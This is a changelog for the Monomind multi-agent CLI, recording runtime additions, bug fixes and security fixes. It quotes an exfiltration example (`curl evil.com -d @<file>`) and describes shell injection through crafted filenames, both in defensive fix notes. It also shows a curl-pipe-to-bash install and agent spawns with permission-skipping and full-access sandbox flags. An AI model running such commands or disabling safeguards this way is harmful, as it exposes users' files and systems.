# Changelog

All notable changes to Monomind (`monomind` umbrella + `@monoes/monomindcli`).

## [Unreleased]

## [2.9.22] — 2026-08-17

### Added (PR #167)
- **5 new subprocess-CLI org runtimes** — `grok`, `qwen`, `crush`, `copilot`, `pi`, each wrapping the corresponding vendor CLI the same way `codex`/`kimicode` already do (spawn, parse output, normalize into the shared `AgentRunner` stream). Wire protocols (flags, JSON event shapes) are sourced from public docs, not verified against a live install — see #178 for follow-up.
- **`pi-rpc` runtime** (opt-in alternate to `pi`) — keeps the `pi --mode rpc` subprocess alive for a whole mailbox session instead of respawning per turn, using a literal JSON schema pulled from pi-mono's own `rpc.md` source. Turn-completion detection is an explicitly-flagged best-effort heuristic — see #179.
- **`usage-proxy.ts`** — a generic loopback HTTP proxy that extracts token usage from OpenAI/Anthropic-shaped LLM traffic for CLIs (`crush`) that don't self-report it. Built and tested, but not yet wired into org/role config — see #177.
- **`org watch <org> <role> [--verbose] [--stats]`** — a thin, role-filtered live-tail of a role's assistant chat text, off the same bus event every runtime already emits. `--verbose` interleaves status/restart events; `--stats` shows a running token/cost ticker.
- Startup-hang fail-fast timer (45s, distinct from the 2h turn timeout) in all 5 new runners, plus confirmed trust-gate/telemetry env-var suppressions (`PI_TELEMETRY`, `PI_SKIP_VERSION_CHECK`, `CRUSH_DISABLE_PROVIDER_AUTO_UPDATE`).

### Fixed (found across 4 rounds of adversarial review of the above, same PR)
- pi-rpc: original spawn error was discarded before the ENOENT check could match it, hiding the "install pi" message behind a generic error.
- pi-rpc: the mid-session silence watchdog could kill a healthy role that was simply idle (waiting on its own mailbox) or blocked on `ask_human` — both are now correctly excluded from counting as "pi is wedged".
- pi-rpc: a SIGKILL escalation could be cancelled mid-grace-period by its own cleanup path, risking an orphaned process.
- `crush`/`grok`/`qwen`/`copilot`/`pi` runners: timer cleanup could be skipped entirely on a stdout stream error, leaking the turn timeout and orphaning the child process (now also killed on that path).
- `crush`: usage-proxy totals were reset every tool-call round instead of once per turn, discarding all but the last round's usage.
- `grok`/`qwen`: tool-result rounds after the first could silently lose all conversational context if session-id parsing ever failed.
- `usage-proxy`: Accept-Encoding wasn't stripped (a gzipped upstream response silently parsed to garbage → 0 usage forever); Anthropic's `input_tokens` (nested under `message.usage` on `message_start`) was never checked, and "last chunk wins" logic could erase an earlier chunk's field when a later chunk didn't repeat it.

### Known follow-ups
See #177 (wire up usage-proxy), #178 (install & validate all 6 CLI-backed runtimes incl. `codex`), #179 (verify pi-rpc's completion heuristic), #180 (confirm `crush --continue` session scoping), #181 (copilot has no usage accounting), #182 (session-lifetime `qwen-rpc`, blocked on confirming qwen's bidirectional wire format).

## [2.9.21] — 2026-08-16

### GitHub issue fixes
- **#156 — `control-start.cjs` adopt-loop silently adopted an auth-mismatched server after #150's own fix.** `probeStatus()` returns the string `'unauthorized'` (not `null`) for a server that answers but rejects the dashboard token — a non-empty string is truthy in JS, so the adopt loop treated a 401-rejecting server exactly like a healthy one, writing `pid:0` and leaving the mismatch in place instead of skipping past it to scan for an actually-adoptable server.
- **#158 — idle-nudge and `org_complete` guidance let the boss end a multi-phase goal after just one batch.** The idle-watchdog nudge offered only a binary choice ("call `org_complete`" or "reassign stalled work"), with no option for "nothing's stalled, but the goal has more scope left — dispatch the next batch instead." Combined with ambiguous "goal is achieved" wording that never distinguished "this batch" from "the org's full stated goal," the boss had no textual signal steering it away from over-eagerly ending a run with real scope remaining. Reworded the kickoff briefing, the idle-nudge (now a real three-way choice), and the `org_complete` tool description to make that distinction explicit.
- **#160 — `org approve`/`deny`/`answer`/`gate-approve` never sent the daemon auth credential on the live-delivery path.** `/api/answer-question`, `/api/set-approval`, and `/api/resolve-gate` all require an `x-monomind-cred` header; the client attached it correctly for `/api/xdeliver` but not these three, so every live delivery 401'd and silently fell back to the slower offline file-write path (only a warning printed — easy to miss).
- **#163 — `countSdkProcesses`/`reapOrphanedSdkProcesses` spammed console errors on Windows.** Both unconditionally shelled out to `pgrep`/`ps`, which don't exist on native Windows; the failure was caught, but `execSync` inherits stderr by default, so every lazy role spawn printed `'pgrep' is not recognized...` to the console. Now skips the shell-out entirely on `win32` (returns 0 / unknown) and silences inherited stderr on the platforms where the commands do exist.

### Added
- **`policy.autoApproveTools`** — a role's policy can now name specific sensitive actions (`Bash`, `WebFetch`, `WebSearch`, `org_complete`, …) it's pre-trusted for, bypassing the human-approval pause for just those actions on that role. Still subject to `allowTools`/`denyTools` and the policy engine's own decision — this only skips the "pause and wait for a human" step for actions the operator has explicitly opted the role into.

## [2.9.20] — 2026-08-15

### GitHub issue fixes (#155 follow-up)
- **Dashboard's `activeOrgs` gap-fill still couldn't detect a completed run after the first #155 fix** — the corrected event-string matching was right, but `run_events` (SQLite) is only populated by *live* event forwarding while a dashboard is connected, not backfilled from a run's actual history. A dashboard started after a run had already stopped never saw most (or any) of that run's events — including its terminal one — so the query had nothing to match. Replaced the whole event-scanning approach with a direct read of `runtime.json`'s own authoritative `status` field (the exact thing `monomind org status` reads), also treating a `"running"` record with a dead pid as not-active. Verified end-to-end against a real running server instance, not just unit tests.

## [2.9.19] — 2026-08-15

### Refactor (#122, PR #154)
- Pruned unwired memory consolidation subsystems (`ControllerRegistry`, `database-provider.ts`, `UnifiedMemoryService`, `TieredCacheManager`) that were maintained against mocks and never invoked by the live CLI or MCP runtime — net -3,244 lines. Fixed a build-breaking re-export of already-deleted functions introduced during the PR's own merge before shipping it.

### GitHub issue fixes (#155)
- **Dashboard's `activeOrgs` gap-fill never detected a completed run.** The SQLite path checked `type IN ('run:complete','org:complete','org:stop')` — daemon.ts never emits any of these; the real terminal signal is a `type:'status'` event with `msg:'org stopped'` or `reason:'org-complete'`, carried in the JSON-stringified `raw` column, not a dedicated type string. Every org's latest run was always reported active regardless of whether it had actually finished. The JSONL fallback (used when sql.js is unavailable) had the same stale `<org>/runs/` path bug already fixed in #138 for `statusline.cjs` — Org Runtime v2 writes `<org>/<runId>/bus.jsonl`, not a `runs/` directory. Both paths now match the real terminal signals/paths.

## [2.9.18] — 2026-08-15

### GitHub issue fixes (#149)

- **`org run --resume` no longer dies silently on a stale SDK session.** The reported symptom (org idle 10m, boss "unreachable", zero messages/tokens exchanged) traced to `resumeSessionId` being seeded from the checkpoint's persisted SDK session_id — which can legitimately no longer exist on the provider's side by resume time (the repro resumed ~8h after `org stop`). Any error on that first resumed call besides the turn-limit pattern was rethrown straight into the crash/backoff path: 3 attempts over ~21s, then a terminal crash that closes the mailbox — matching "Messages: 0" and "boss unreachable" exactly. Mirrors the existing turn-limit-recovery pattern: the first failure on a checkpoint-provided session id now drops it and retries once with a fresh session instead of crashing, bounded so a second, real failure still crashes normally.
- Note: the issue's own proposed root cause (mailboxes staying closed after `org stop`) was verified **not** to hold on current code — `finishStop()` snapshots the checkpoint before closing mailboxes specifically so this doesn't happen. A fix built on that diagnosis was drafted and discarded after it regressed the existing "no zombie agents on resume" invariant for genuinely crashed roles.

## [2.9.17] — 2026-08-15

### GitHub issue fixes (#152)

- **The org-stop drain-timeout audit event no longer hides which roles were cut off mid-work.** On a real 22-role org run, `org_complete` was called while six workers were still actively writing files; the 5-minute drain window let most finish, but at least one was still mid-write when it expired and got force-stopped — the resulting audit event said only "proceeding anyway," with no way to tell real in-progress work being cut off from idle-but-not-yet-reaped sessions. `finishStop()` now collects every role still `'running'` (mid-turn) at the moment the drain window expires, includes that roster in both the audit message and structured `data.stillActive`, and omits the "still active" suffix entirely when nothing was actually cut off.
- `org_complete`'s tool description now tells the boss to check `org_tasks` and avoid calling it while siblings have in-progress work, reaching the model at the exact moment it decides to call it.

## [2.9.16] — 2026-08-15

### GitHub issue fixes (#150)

- **`control-start.cjs` no longer trusts a live-but-auth-mismatched dashboard.** `probeStatus()` used to collapse "no server there" and "a server answered but rejected our dashboard-token" (401) into the same `null` result, so a live server left over from a prior port collision — up, but pairing-mismatched — was indistinguishable from a healthy one. It now returns a distinct `'unauthorized'` sentinel, and the "already running" check treats that as stale and restarts, same as a project or build mismatch.
- **`monomind org run` now actively verifies/heals the dashboard on every run**, instead of only trusting whatever `control.json` already had. It (re)invokes the project's own `.claude/helpers/control-start.cjs` if `monomind init` has set one up, so a stale/dead/mismatched dashboard self-heals per run, not only once at Claude Code `SessionStart`.

### Fix
- Synced a leftover cross-copy drift in `statusline.cjs` (root `.claude/`/`.gemini/` were missing the `getVersion` testability export that `packages/@monomind/cli/.claude/` already had, from #146/PR #147) — caught by this repo's own tree-parity check.

## [2.9.15] — 2026-08-15

### Critical fix — broken 2.9.14 publish (#148)

- **`monomind@2.9.14`/`@monoes/monomindcli@2.9.14` were published with 5 unresolved `workspace:*` dependencies and were uninstallable** (`npm error code EUNSUPPORTEDPROTOCOL`) — this release supersedes them via a correct `pnpm publish`, verified against the registry after publishing (all 5 previously-`workspace:*` deps resolve to real version numbers). `2.9.14` is deprecated on npm pointing here.
- **Closed a blind spot in the #130 publish guard** (`check-workspace-deps.mjs`) that let this through undetected: it only scanned `dependencies`/`devDependencies`/`peerDependencies`, missing 4 of the 5 affected deps (`@monoes/hooks`, `@monoes/mcp`, `@monoes/memory`, `@monoes/routing`), which live under `optionalDependencies`. It now scans that too.
- The actual #146 fix (statusline `getVersion()` on Windows) is included here as well — it shipped correctly in the 2.9.14 *source*, just not the broken publish.

## [2.9.14] — 2026-08-15

### GitHub issue fixes (#146)

- **#146 — `statusline.cjs` `getVersion()` always showed the `v1.0.6` placeholder on Windows.** The npm-global-prefix fallback only checked the Unix layout (`<prefix>/lib/node_modules/monomind/package.json`), but npm on Windows puts global packages directly under `<prefix>/node_modules/` — so the fallback silently failed on every Windows install and the hardcoded placeholder won. Now both layouts are checked in turn (Windows first, then macOS/Linux), and only when both miss does the placeholder remain.

## [2.9.13] — 2026-08-15

### GitHub issue fixes (#144)

- **#144 — `confirmPort()` decoupled from the SessionStart hook's 5s timeout.** #142/#143's liveness-based wait can legitimately take up to ~5 minutes (cold npx resolve, AV/filesystem contention right after an install), but it ran inline inside the same process the hook kills at 5s — so in real usage it almost always got truncated before confirmation ever completed, defeating those fixes and leaving `control.json` stuck on its pre-confirmation optimistic guess. `main()` now spawns the dashboard, writes the optimistic status, hands confirmation off to a second fully independent detached process, and exits immediately — matching this file's own module docstring, which wasn't actually true before this change. The new `runConfirm()` process is free to take as long as it legitimately needs without the hook's timeout ever touching it.

## [2.9.12] — 2026-08-14

### GitHub issue fixes (#142 follow-up)

- **#142 follow-up — `confirmPort()` now waits on liveness, not a fixed budget.** #142's 30s npx-fallback budget helps the common case, but a follow-up report found it's still occasionally too tight right after a fresh global reinstall — one run measured the server taking ~142s to report (vs. the normal ~5-9s), likely npm/AV-scan contention on a freshly-written `node_modules` tree, not registry resolve time. `CONFIRM_ATTEMPTS` is now a minimum grace period, not the hard budget: past it, `confirmPort()` only gives up once the child has actually exited — a live child that simply hasn't reported yet keeps getting the benefit of the doubt, up to a 5-minute absolute safety-net ceiling.

## [2.9.11] — 2026-08-14

### GitHub issue fixes (#143)

- **#143 — `confirmPort()`'s identity check couldn't survive #141's `shell: true` fix.** Under `shell: true`, `child.pid` is the wrapping `cmd.exe`'s pid, not the real dashboard server's — so the `rep.pid === child.pid` comparison against the server-reported pid (`BOUND_REPORT`) could never match on the npx-fallback path, no matter the timeout (#142's fix didn't help). The npx-fallback path always fell through to "server did not respond" and killed a server that was, in practice, already up. Identity was never really about the pid match: `BOUND_REPORT`'s path is already unique per invocation, so its mere presence with a valid port is sufficient proof of ownership. Dropped the pid comparison and switched `control.json` to record the real, server-reported pid (`rep.pid`) instead of `child.pid`.

## [2.9.10] — 2026-08-14

### GitHub issue fixes (#141 follow-up, #142)

- **#141 follow-up — `control-start.cjs` is now synced by `monomind init upgrade`.** It was never in the `HELPER_FILES` force-sync registry, so existing projects never picked up the #141 EINVAL fix automatically; users had to manually copy the file out of `node_modules`. Registered alongside `statusline.cjs`/`graphify-freshen.cjs` (force-synced, doctor-tracked, no fallback generator).
- **#142 — `confirmPort()`'s 10s window is now 30s for the `npx` fallback path.** Every other `findCliPath()` branch spawns `node` directly against an already-resolved path and pays no resolve cost, but the last-resort `npx monomind@latest ui` fallback pays npx's own first-time package resolve into its `_npx` cache — measured at ~12.4s cold vs ~3.4s warm. On a fresh install this killed the dashboard child as a false "orphan" before it could ever bind, exactly on the first-session case auto-start exists for.

## [2.9.9] — 2026-08-14

### GitHub issue fixes (#141)

- **#141 — `control-start.cjs` no longer silently fails to auto-start the dashboard on Windows.** The `npx.cmd` last-resort fallback was spawned without `shell: true`, which Windows requires to exec a `.cmd`/`.bat` file; the call threw `EINVAL` synchronously and the wrapper's `main().catch(() => process.exit(0))` swallowed it with zero diagnostics. `spawn()` now sets `shell: true` when the resolved command ends in `.cmd`/`.bat` on `win32`, and the outer catch logs the failure (unless `MONOMIND_HOOK_QUIET`) and releases the spawn lock instead of exiting silently.

## [2.9.8] — 2026-08-14

> Rollup release cut from `main`. The 2.9.5–2.9.7 patch releases were cut from
> a `release/v2.9.5` branch and never ported their changelog back; 2.9.8
> reconciles both lines — everything below is in the 2.9.8 tarball.

### GitHub issue fixes (#133, #136–#140)

- **#140 — a role hitting `max_turns_per_message` no longer crashes the org.** A turn-limit error (thrown or `error_max_turns` result) now grants a bounded continuation turn with a fresh session instead of permanently dropping the role mid-task. **`monomind org run <name> --resume`** reconstructs role state from the persisted checkpoint (mailbox queues, policy usage, metrics, scrollback, SDK session ids) via `startOrg({resume})` — the checkpoint was previously write-only. `checkpoint.status` now tracks the runtime status it was captured under instead of always claiming `running`.
- **Default `max_turns_per_message` is now 100,000** (`DEFAULT_MAX_TURNS_PER_MESSAGE`) — effectively unlimited so the ceiling can never brick a legitimately long task. Real guardrails remain `budget_tokens`, the idle watchdog, and the circuit breaker. `org create` mentions it budget-style; explicit per-org/per-role values are preserved. The `org run` cost estimate caps its planning math at 30 turns/message so the unlimited default doesn't balloon it.
- **#139 — new `monomind ui` command** (alias `dashboard`) starts the Neural Control Room from the published CLI — `control-start.cjs`'s `npx monomind@latest ui` fallback path works now (`--port`, `--no-open`, `--project-dir`).
- **#137 — Windows SessionStart crash fixed.** The npx fallback resolves `npx.cmd` on win32 and the spawned child carries an `error` listener that releases the spawn lock instead of crashing the hook.
- **#138 — statusline `getActiveOrgs()` reads Org Runtime v2 `runtime.json`** (status + pid liveness) instead of a `runs/` directory the daemon never writes — the active-org row appears while an org is running. Also exposed in `--json` output.
- **#136 — dashboard visibility self-heals.** `control-start.cjs` treats an auth-walled 401 from `/api/status` as a foreign server (the adoption path was dead code under real auth). The org-run event forwarder warns once — unconditionally — when no live dashboard exists, treats a dead recorded pid as no-dashboard, and spawns the dashboard server itself (single-flight, same bound-report contract as control-start) so `org run` events no longer silently go nowhere.
- **#133 — route-outcome correlation wired.** `hooks route` records a `routeId` recommendation to `route-outcomes.jsonl`; session-end joins by `routeId` and backfills the measured outcome — the caller wiring `doctor`'s primary routing-learning path was waiting on.

### Runner fixes

- Vercel AI SDK v7 stream/usage field names corrected in `vercel-runner.ts` (usage deltas arrive on the final chunk; per-chunk field access produced NaN token counts).
- Kimi model namespace (`kimi-code/k3`) and Antigravity event parsing (`init` → `step_update` → `result`) corrections.
- `org run`'s cost estimate resolves each role's actual model (`resolveModel`) for labels instead of a hardcoded default.

### Library bumps (carrying main-only work to npm)

- `@monoes/hooks` 1.0.5 — Reflexion background worker (`worker-reflexion.ts`).
- `@monoes/mcp` 1.0.3 — MCP registry population (`registry-metadata.json`, `/registry` server routes).
- `@monoes/memory` 1.0.15, `@monoes/routing` 1.0.4 — version sync with npm content (no code change); keeps workspace pins monotone.
- `@monoes/monograph` stays 1.5.8.

### Graph engineering playbook — dynamic work graphs + structured handoffs

Adaptation of the July 2026 "Graph Engineering for Multi-Agentic Systems"
playbook (Ng). The org runtime's TaskDag graduates from a static dependency
tracker to a dynamic work graph. Source of truth: `docs/graph-engineering-playbook.md`.

#### Dynamic TaskDag operations (`task-dag.ts`)

- **`split(parentId, children)`** — scope expansion (playbook §2.2).
- **`merge(sourceId, targetId)`** — early convergence (playbook §2.2).
- **`cancel(taskId, reason?)`** — evidence made it moot (playbook §2.2).
- New statuses: `split`, `merged`, `cancelled`. New fields: `splitFrom`, `mergedInto`.

#### New agent tools (`session.ts`)

- **`org_task_split`**, **`org_task_merge`**, **`org_task_cancel`** — wrap the new DAG ops.
- **`org_plan_graph`** — work graph generator (playbook §2.4).

#### Structured Handoff Protocol (`types.ts`)

- **`OrgHandoffSchema`** — typed envelope for inter-role context packages (playbook §2.3).

#### Per-node failure routing (`types.ts`)

- **`FailureRoutingSchema`** — retry / fallback / escalate rules (playbook §2.6).

#### Graph observability (`types.ts`)

- **`trace` BusEvent type** — per-node execution traces (playbook §2.5).

#### Org templates (`templates.ts`)

- **`kg-extraction`** — 4-role multi-agent knowledge-graph extraction pipeline.
- **`advisor-orchestrator`** — cost-efficient planner + workers pattern (playbook §2.7).

#### Tests

- 61 new tests in `tests/orgrt/` (task-dag, graph-engineering-types, dag-ops, templates, session-tools).

### Universal provider support — Vercel AI SDK + Codex CLI runners

Two new `AgentRunner` implementations extend the org runtime beyond the
Claude/Kimi/Opencode trio. Combined with the existing runners, every major
subscription and API key auth path now has a first-class home.

#### `VercelAgentRunner` — any API-key provider via the Vercel AI SDK

- **Activation:** `runtime: 'vercel'` (per-role or org-level) or auto-resolved from `provider.kind: 'vercel-api-key'`
- **Vendor registry:** 15 providers — OpenAI, Anthropic, Google, xAI, DeepSeek, **GLM** (z.ai), Mistral, Groq, Together, Fireworks, Cohere, Perplexity, Alibaba, OpenRouter, Ollama — plus a generic `openai-compatible` escape hatch
- **Primitive:** `streamText + stopWhen: isStepCount(N)` (Vercel v7)
- **Tool delivery:** Native Vercel `tool()` calling with `canUseTool` policy gating (no fence protocol needed)
- **Session resume:** `VercelSessionStore` persists message history to disk (Vercel SDK is stateless)
- **Cost tracking:** Token-only (`cost_usd: 0` — Vercel returns no USD; token budgets still enforce via policy.ts)
- **Files:** `orgrt/vercel-runner.ts`, `orgrt/vercel-providers.ts`, `orgrt/vercel-session-store.ts`
- **Optional deps:** `ai`, `@ai-sdk/openai`, `@ai-sdk/anthropic`, `@ai-sdk/google`, `@ai-sdk/xai`, `@ai-sdk/deepseek`, `@ai-sdk/mistral`, `@ai-sdk/groq`, `@ai-sdk/togetherai`, `@ai-sdk/fireworks`, `@ai-sdk/cohere`, `@ai-sdk/perplexity`, `@ai-sdk/alibaba`, `@openrouter/ai-sdk-provider`, `ollama-ai-provider`

#### `CodexAgentRunner` — ChatGPT subscription via Codex CLI subprocess

- **Activation:** `runtime: 'codex'` or auto-resolved from `provider.kind: 'codex'`
- **Auth:** Inherits `~/.codex/auth.json` from `codex login` (ChatGPT Plus/Pro/Team/Enterprise). No API key needed.
- **Pattern:** Subprocess (same as `KimiCodeAgentRunner`) — spawns `codex exec --experimental-json --sandbox danger-full-access`, parses JSONL events
- **Tool delivery:** Fence protocol (same as kimi/opencode) — `executeToolCall` now accepts `canUseTool` for policy gating
- **Protocol:** Byte-accurate against `openai/codex/sdk/typescript/src` — `thread.started` captures `thread_id`, `item.completed` with `type: 'agent_message'` yields assistant text, `turn.completed` carries usage
- **Resume:** `codex exec resume <thread_id>` (positional, not a flag)
- **Files:** `orgrt/codex-runner.ts`, `orgrt/tool-fence.ts` (executeToolCall signature extended)

#### `AntigravityAgentRunner` — Google AI Pro/Ultra via Antigravity CLI

- **Activation:** `runtime: 'antigravity'` or auto-resolved from `provider.kind: 'antigravity'`
- **Auth:** OS keyring credentials from running `agy` interactively once (Google OAuth). Google AI Pro/Ultra consumer subscription flows through this — Gemini CLI's consumer OAuth was sunset June 18, 2026; Antigravity is the official replacement.
- **Pattern:** Subprocess (same as `KimiCodeAgentRunner` / `CodexAgentRunner`) — spawns `agy -p "<prompt>" --output-format stream-json --dangerously-skip-permissions`, parses NDJSON events
- **Protocol:** Event types `init` → `step_update` (multiple) → `result`. Session ID captured from `conversation_id`. Per-token streaming accumulated and emitted as one assistant message per turn (fence stripping needs full text; matches kimi/codex behavior).
- **Resume:** `--conversation <conversation_id>`
- **Tool delivery:** Fence protocol (same as kimi/codex/opencode)
- **Install:** Go binary via `curl -fsSL https://antigravity.google/cli/install.sh | bash` (no npm package)
- **Files:** `orgrt/antigravity-runner.ts`

#### Schema + provider resolution

- `ProviderSchema.kind` extended: `'vercel-api-key'`, `'codex'` (existing kinds unchanged — backward compatible)
- `ProviderSchema.vendor` field added (15 values + `openai-compatible`)
- `runtime` enum extended in `RoleSchema` + `OrgDefSchema`: `'vercel'`, `'codex'`
- `resolveRunner()` + `resolveRoleRunner()` in `daemon.ts` now auto-resolve runtime from provider kind when no explicit `runtime` field is set
- `resolveModel()` in `session.ts` returns per-vendor default models (e.g. GLM → `glm-5.2`, Codex → `gpt-5.6-terra`, DeepSeek → `deepseek-chat`); explicit `adapter_config.model` always wins

#### SDK upgrades

- `@anthropic-ai/claude-agent-sdk` 0.3.207 → 0.3.226 — unlocks Opus 5 (`model: 'opus'` or `'claude-opus-5'`), includes MCP-connection bug fixes, better error surfacing. No breaking changes.
- **Subagent depth change:** Claude SDK 0.3.217 lowered default subagent spawn depth from 5 to 1. Swarm code relying on deep nesting must set `CLAUDE_CODE_MAX_SUBAGENT_SPAWN_DEPTH=5`.
- **Kimi stderr fix:** `kimicode-runner.ts` now defensively extracts `session_id` from stderr as well as stdout (kimi 0.33+ may emit `session.resume_hint` on stderr in stream-json mode).

## [2.9.3] — 2026-08-11

### Publish, CLI startup, and doctor fixes (#119, #130, #131, #132)

- **#130 (critical) — `2.9.2` was uninstallable.** `packages/@monomind/cli/scripts/publish.sh` published with plain `npm publish`, which copies pnpm's `workspace:*` protocol verbatim into the tarball — `@monoes/monograph` resolved to the literal string `"workspace:*"`, which no consumer can install. Switched to `pnpm publish` (which resolves the pin correctly, same as the root package already does) and added `scripts/check-workspace-deps.mjs`, wired into the CLI package's `prepublishOnly`, to hard-block any future non-pnpm publish of a workspace-linked package.
- **#119 — lazy CLI command loading.** Every invocation (including `--version`) used to eagerly import all 32 command modules and their transitive dependencies (including the Claude Agent SDK via `org.ts`). `commands/index.ts` now lazy-loads each command on demand; `--version` imports none of them. A two-phase parse in `index.ts` resolves and registers only the invoked command's full subtree before parsing, preserving correct flag/alias scoping at any subcommand depth.
- **#131 — `doctor`'s npm check swallowed real errors.** `checkNpmVersion` mapped every failure (timeout, spawn error, genuine absence) to a fixed "npm not found" message even when npm was actually installed and working. It now distinguishes timeout vs `ENOENT` vs other errors and includes the underlying error detail.
- **#132 — `init` ran an undisclosed global install with no opt-out.** `monomind init` unconditionally ran `doctor --install` (which may `npm install -g @anthropic-ai/claude-code`) with no way to skip it and no notice before the network call. Added `monomind init --no-install`, and a one-line disclosure printed before the install actually runs.

## [2.9.2] — 2026-08-09

### PDF engine swap + post-init document ingestion

- **Replace pdf-parse with @firecrawl/pdf-inspector** — native Rust PDF extraction via napi-rs. Produces markdown output with headings, tables, and multi-column detection instead of plain text. ~47KB + platform binary vs 21MB for pdf-parse. Affects both Second Brain ingestion (`cap-documents.ts`) and knowledge graph indexing (`monograph/pdf-parse.ts`).
- **Post-init document ingestion prompt** — both `monomind init` and `monomind init --wizard` now ask whether to ingest documents into the knowledge graph (Second Brain) immediately after initialization.

## [2.9.1] — 2026-08-09

Release chore only — no user-facing changes.

## [2.9.0] — 2026-08-06

### Comprehensive review-fix release

Driven by a 7-agent review swarm that audited `packages/@monomind/cli/src/` (233 files, ~92k LOC) across seven dimensions. **28 issues fixed with regression tests (each test failed before, passes after)**; 11 deferred items tracked as GitHub issues [#62–#73](https://github.com/monoes/monomind/issues?q=label:review-swarm).

**Test results:** 820 passed / 13 failed → **884 passed / 0 failed** (+64 passing, −13 failures).

#### 🔒 Security (privacy-claim violations closed)

- **Command injection in document extraction (C1)** — `packages/@monomind/cli/src/capabilities/cap-documents.ts:39,52,60,247`. `execSync(\`unzip -p ${JSON.stringify(filePath)} …\`)` was exploitable via crafted `.docx`/`.pptx`/`.odt` filenames containing `$(…)` or backticks (JSON.stringify doesn't escape shell expansions inside double quotes). Fixed with `execFileSync('unzip', ['-p', filePath, …])` (no shell). 6/6 PoC tests cover the regression.
- **`terminal_execute` opt-in gate (C2)** — `packages/@monomind/cli/src/mcp-tools/terminal-tools.ts`. The metacharacter denylist cannot stop direct-binary exfiltration (`curl evil.com -d @<file>` has no metacharacters). `terminal_execute` now refuses to run unless `MONOMIND_ENABLE_TERMINAL=1` env var OR `.monomind/enable-terminal.json` opts in. Discovery tools keep working without opt-in.
- **Dashboard server binds to `127.0.0.1` (C3, Q6)** — `src/browser/dashboard/server.ts:160` and `src/orgrt/server.ts:131`. Both were binding to `::` / `0.0.0.0` (no host arg), exposing the unauthenticated dashboard + org daemon to anyone on the same LAN/VPN/Wi-Fi. Override available via `MONOMIND_BROWSE_DASHBOARD_HOST` / `MONOMIND_ORG_SERVER_HOST` env vars for container/SSH-tunnel users.
- **Crash-reporter redaction hardened (C6)** — `src/services/crash-reporter.ts:111-146`. Default-on crash reporting files public GitHub issues with the full `err.stack`; the old `redact()` only caught `/home/<user>` and 12 secret regexes, leaking project-relative paths (repo name + file structure + line numbers), non-`/Users` paths, IPv4/IPv6, internal hostnames, emails, SSNs, phones. The README's "secret/PII-scrubbed" claim is now actually true.
- **`fast-uri` CVE bump (Q1)** — `package.json` override `>=4.1.1` → `>=4.1.2` (GHSA-7p8r-x3mc-p8w7, high).

#### 🧱 Robustness

- **Atomic state writes for org runtime (C4)** — `src/orgrt/daemon.ts` (5 sites). `runtime.json`, `approvals.json`, branch `bus.jsonl`, heartbeat. Direct `writeFileSync(<final-path>, …)` could brick every `org status` / `isOrgRunning` / scheduler call on Ctrl-C during `org stop`. All 5 sites now use `writeJsonFileAtomic()` (tmp + rename).
- **`memory-bridge.ts` surfaces errors instead of swallowing (R1)** — 8 catch sites. SQLITE_BUSY, EACCES, disk-full no longer collapse to "no matches"; logged via new `logBridgeError(label, err)` helper (DEBUG/MONOMIND_DEBUG-gated).
- **`sql.js`-missing fallback no longer fakes a SQLite file (R2)** — `src/memory/memory-initializer.ts:352-405`. Old code wrote a 4 KB "SQLite format 3" header to disk and reported `success:true`; every subsequent read failed and `checkMemoryInitialization` looped forever. Now returns `success:false` with a clear install hint.
- **`busy_timeout:5000` for concurrent SQLite access (R3)** — added to the `@monoes/memory` config. Concurrent MCP server + CLI hook hitting the same `memory.db` no longer silently lose writes to SQLITE_BUSY.
- **Git worktree `execSync` calls carry `timeout:30000` (R4)** — 7 sites in `daemon.ts`. A wedged git hook (git-lfs, gc lock, gpg sign prompt) could previously hang the whole daemon forever.
- **`checkApproval`/`setApproval` serialized per-org (R5)** — Promise-chain mutex fixes the TOCTOU race on `this.approvals` + `approvals.json`.
- **`OrgCheckpoint` schema gains a `version` field (R6)** — `validateCheckpoint` now detects shape changes explicitly instead of silently failing the checksum.
- **`OrgBus.emit` surfaces durable-log append failures (R7)** — emits a follow-up audit event so lost events are attributable in run history instead of DEBUG-only swallow.
- **Latent checkpoint checksum bug fixed** — `generateChecksum` was using `JSON.stringify(state, Object.keys(state).sort())`. Passing an array as the second arg makes it a *whitelist* applied at EVERY nesting level; nested fields like `roleState.boss.tokensUsed` were silently stripped from the canonical form. **`validateCheckpoint` provided ZERO integrity guarantee since the feature shipped.** Fixed with recursive `stableNormalize` + SHA-256 (truncated to 64 bits).
- **Pre-existing ESM hygiene test failure fixed (Q7)** — `daemon.ts:423` had a bare `require('node:child_process')` that vitest's CJS shim masked but the built package threw "require is not defined" in real Node ESM execution.

#### 🚀 Performance

- **Monograph staleness cached per-repo for 30s (P2)** — `src/mcp-tools/monograph-tools.ts`. Cuts a 50–100ms `git rev-list --count` spawn from every `monograph_query` / `_suggest` / `_staleness` / `_health` call.
- **PPR rerank N+1 batched into `WHERE id IN (?, ?, …)` (P3)** — was ~50 round-trips per call, now 2.

#### 📋 Test coverage for previously-untested critical paths

- **`OrgCheckpoint` round-trip (T3, 9 tests)** — capture → validate → tamper → reject for roleState, pendingRoles, version field, TTL expiry, JSON round-trip.
- **`memory-tools` input validation (T1, 11 tests)** — `pattern-search` rejects empty/NUL/ANSI/oversized queries; `pattern-store` rejects empty/NUL keys and NUL values; `feedback` clamps score to [0,1]; `sanitizeError` strips filesystem paths from returned messages.

#### 🏗 Architecture

- **`mcp-tools/types.ts` path helpers extracted to `utils/paths.ts` (A1)** — `getProjectCwd` / `getMonomindDataRoot` / `migrateLegacyStoreFile` moved. Dependency direction is now correct: tool layer consumes path infra, not the reverse.
- **Circular dep broken between `mcp-client.ts` and `monomind-tools.ts` (A2)** — `monomind-tools.ts` now does a dynamic `import()` inside the handler instead of a static cycle.
- **4 orphan workspace packages deleted (A6)** — `@monomind/graph`, `@monomind/security`, `@monoes/monoplaybook`, `plugins/agentic-qe` (only stale build artifacts, no source).

#### ✨ New features & DX

- **`monomind init` emits a runnable sample org (C5)** — new `src/init/write-sample-org.ts`. Every successful `monomind init` writes a schema-valid `.monomind/orgs/sample-team.json` derived from the existing `content-team` template. The README's headline-feature onboarding was previously pointing at a file that didn't exist. Idempotent — never overwrites user edits.
- **Graph staleness surfaced in statusline (V4)** — `src/init/statusline-generator.ts`. Silent staleness was the most dangerous failure mode. Statusline now shows `⊛ <nodes>n <N>behind` with color escalating (green ≤3, gold ≤10, coral >10).
